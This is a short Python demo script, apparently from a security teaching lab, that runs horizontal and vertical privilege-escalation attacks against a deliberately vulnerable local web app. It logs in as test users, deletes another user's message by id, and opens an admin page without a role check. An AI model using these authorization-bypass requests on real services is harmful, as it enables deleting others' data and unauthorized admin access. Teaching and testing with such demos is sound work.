"""
Privilege Escalation Attack Demo
Demonstrates:
  - Horizontal: alice deletes bob's message (no ownership check)
  - Vertical:   alice (role=user) accesses /admin/users (no role check)
Run against the VULNERABLE app (port 5000).
"""
import requests

BASE = "http://127.0.0.1:5000"


def _session(username, password):
    s = requests.Session()
    s.post(f"{BASE}/login", data={"username": username, "password": password})
    return s


def horizontal_escalation():
    """Alice deletes a message that belongs to bob."""
    # Log in as bob and post a message
    bob = _session("bob", "bob123")
    r = bob.post(f"{BASE}/messages", data={"content": "Bob's private message"}, allow_redirects=True)

    # Find bob's latest message id
    import re
    r2 = bob.get(f"{BASE}/messages")
    ids = re.findall(r'name="msg_id"\s+value="(\d+)"', r2.text)
    if not ids:
        print("[Horizontal] Could not find bob's message id — is the app running?")
        return False
    bob_msg_id = ids[0]

    # Log in as alice and delete bob's message
    alice = _session("alice", "alice123")
    r3 = alice.post(
        f"{BASE}/messages/delete",
        data={"msg_id": bob_msg_id},
        allow_redirects=True,
    )
    # Verify the message is gone
    r4 = alice.get(f"{BASE}/messages")
    still_there = bob_msg_id in r4.text
    success = not still_there
    print(f"[Horizontal] alice deleted bob's msg_id={bob_msg_id}: {'SUCCESS' if success else 'FAILED'}")
    return success


def vertical_escalation():
    """Alice (role=user) accesses the admin user list."""
    alice = _session("alice", "alice123")
    r = alice.get(f"{BASE}/admin/users")
    # Admin page lists all users — look for the table
    success = r.status_code == 200 and ("admin" in r.text or "用户管理" in r.text)
    print(f"[Vertical]   alice accessed /admin/users: status={r.status_code} success={success}")
    return success


if __name__ == "__main__":
    print("=" * 60)
    print("Privilege Escalation Demo — Vulnerable App (port 5000)")
    print("=" * 60)
    h = horizontal_escalation()
    v = vertical_escalation()
    print()
    print(f"Horizontal escalation: {'SUCCESS' if h else 'FAILED'}")
    print(f"Vertical escalation:   {'SUCCESS' if v else 'FAILED'}")
